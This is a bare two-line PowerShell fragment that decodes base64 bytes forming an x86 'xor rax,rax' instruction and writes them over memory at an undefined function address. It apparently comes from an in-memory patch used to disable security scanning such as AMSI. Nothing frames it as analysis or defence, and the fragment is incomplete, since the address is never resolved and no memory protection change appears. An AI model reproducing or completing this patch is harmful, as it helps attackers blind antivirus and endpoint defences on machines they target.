$buf = [Byte[]] ([Convert]::FromBase64String("SDHAAw==")) 
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
